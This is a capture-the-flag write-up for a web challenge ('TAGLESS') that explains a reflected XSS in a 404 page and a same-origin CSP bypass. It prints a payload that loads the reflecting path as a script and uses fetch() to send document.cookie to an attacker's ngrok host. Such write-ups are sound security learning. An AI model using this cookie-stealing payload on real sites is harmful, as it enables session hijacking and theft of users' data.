# TAGLESS (Web Exploitation)

### Challenge Description:

The aim of this challenge was to exfiltrate the flag from a cookie using a reflected XSS vulnerability while bypassing the CSP of the web application.

### Challenge Code Analysis:

<b>Bot Functionality (bot.py):</b>

- The bot uses Selenium WebDriver to interact with a web application.
- It sets a cookie named flag with the actual flag value and makes requests to specified URLs.

<b>Report Endpoint (app.py):</b>

- The `/report` endpoint accepts url form data and uses the bot to visit the URL.
- The URL must be from the localhost or 127.0.0.1 to be valid.

<b>404 Error Handling (app.py):</b>

- The application directly reflects the request path in the 404 error page without sanitization, making it vulnerable to XSS.

<b>CSP:</b>

- The application’s CSP restricts script sources to `self`, which typically prevents inline scripts but allows external scripts from the same origin.

### Vulnerabilities:

<b>Reflected XSS:</b>

- The 404 error handler reflects the request path directly. This lack of sanitization allows injection of arbitrary HTML or JS.
- Injecting a `<script>` tag directly did not work due to CSP restrictions on inline scripts.

<b>CSP Bypass:</b>

- The CSP's script-src directive only allows scripts from 'self', blocking inline scripts and external sources not listed.
- We identified that although inline scripts were blocked, the reflected XSS could still be exploited using an external script loaded from the same origin.

### Payload:

```
url: http://127.0.0.1:5000/<script src="/**/fetch(`https://{ngrok}/?cookie=${document.cookie}`)//"></script>
```

### Flag:

`SEKAI{w4rmUpwItHoUtTags}`